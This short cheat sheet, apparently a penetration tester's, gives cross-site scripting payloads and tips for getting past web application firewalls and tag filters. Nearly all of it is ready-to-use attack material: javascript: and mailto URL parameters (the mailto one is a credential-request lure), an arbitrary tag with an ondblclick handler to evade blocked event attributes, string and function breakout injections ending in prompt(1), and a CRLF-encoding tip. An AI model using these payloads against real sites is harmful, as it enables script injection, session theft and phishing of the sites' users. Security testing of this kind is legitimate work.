WAF Got You Down or Certain Tags Stripped?
==============

/?SomeParam=https://TheDomainYouAreOne&TheirParam=javascript://prompt(1)

/?SomeParam=https://TheDomainYouAreOne&TheirParam=mailto://SomeoneEvil@SOMEDOMAIN?Subject=How about that!%26Body=Please send me credentials

/?SomeParam=https://TheDomainYouAreOne&TheirParam=https://www.google.com

Did you break out of a tag for and script, iframe, img, a etc are all blocked?
==============

Did they block onerror onload onclick? Try something like this:

&lt;XXXXXXX ondblclick=prompt(1)&gt;Some Text, Don't even care to end the tag either.

Don't forget the injection might not be a form tag but in the javascript.
==============
";prompt(1);//

';prompt(1);//

What if they are in a function? Break out of it. Count the brackets, etc to kill the function.

"};prompt(1);//

Don't forget %0D%0A if you need a new line
